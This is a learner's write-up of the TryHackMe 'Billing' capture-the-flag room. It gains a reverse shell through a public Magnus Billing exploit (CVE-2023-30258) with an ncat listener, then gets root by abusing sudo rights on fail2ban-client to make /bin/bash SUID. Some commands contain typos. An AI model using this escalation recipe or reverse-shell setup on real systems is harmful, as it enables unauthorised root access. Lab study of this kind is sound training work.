# Room: Billing <img src="https://cdn-images.tryhackme.com/room-icons/618b3fa52f0acc0061fb0172-1741192887584" alt="Billing / Payment" width="50" height="50">


**Infos:** <br>
Difficulty: easy<br>
Est. Time: 45min<br>
Task: Get access, finde / use exploit and  escalate privileges.<br>
👉 Link: https://tryhackme.com/room/billing <br>
<br> 
<br>
# 📖 Things that I learned:
## 🐍 Fail2Ban
A service for banning IPs and handling incoming attacks <br>
You can configure actions on ban and much more! <br>

## 🛡️Exploitation
Searching for an exploit is an important skill, but it is better to know how to use it.
I used the Exploit from https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit
1. Create file with the exploit init
2. ncat -lvnp (port)
2. python3 exploit.py -t (labMachine) -a (yourIP) -p (port)

## ⛓️‍💥 Privilege Escalation
How to escalate privileges with fail2ban

```
sudo fail2ban-client Status
sudo fail2ban-client set sshd Action iptables-multiport actionban "chomod +s /bin/bash"
sudo fail2ban-client set sshd banip 127.0.0.1
bin/bash/ -p
```

## ℹ️ Why and how did this actually work?
First of all, this could never have happened if the permissions had been configured correctly.
I had permission to execute `fail2ban-client` with root privileges.
Since Fail2ban executes configured actions with its own privileges, I was able to abuse the action configuration to execute commands as root.
After that, I banned the loopback address (`127.0.0.1`) to trigger the action.
This caused the configured command to modify the permissions of `/bin/bash`.
And now, whenever I start a new Bash shell using `bash -p`, I get a shell with root privileges.
**Privilege escalation successful!** 🚀
<br>
<br>

# 💡 How I solved the room

**⚠️ Way-in** <br>
In the beginning it was confusing I didn't found a way-in. <br>
Then I looked at the rooms I did before and thats when I'd thougt about exploiting it. <br>
So I searched for an exploit called "Magnus Billing" <- because the website was called like that. <br>
After copying one from github I connected to the reverse-shell, it worked pretty well & easy. <br> <br>

**🚩 Finding the first flag** <br>
It didn't took long to find the first flag inside the `/home/magnus/firstFlag.txt` directory <br>

**⛓️‍💥 Getting root**
After that I used the basic `sudo -l` command to see interesting commands. <br>
And my current user had root privileges at **Fail2Ban**, I had to google a bit to even find out what this service is actually doing. <br>
I already explained what it does above. But back to the escalation, I actually found an interessing post on a <br>
website that showed how to manage actions when a IP-Adress gets banned. <br>
I tried to get higher permission and yes it actually worked.<br>
The only thing stopping me was knowing how to ban specific IP-Adresses. <br>
Thats the point where I had ask to google and the THM-AI.<br>
But everything worked and I got successfully root-privileges <br>
**Successfully hacked up to root-privileges!** ⚠️

**🚩 Finding the first flag** <br>
After I got root-privileges I just repeated the same process as before `cd /home/root`, then `ls -la`<br>
Then it said `root.txt` with the flag inside :)

# 🛡️ How could this be prevented?
First step is always update software and if you're the creator, please make sure to keep track of bugs inside you'r software.<br>
<br>
<br>

---
<p align="center">Very well made room, I would recommand doing it just for practice and fun 🥳</p>
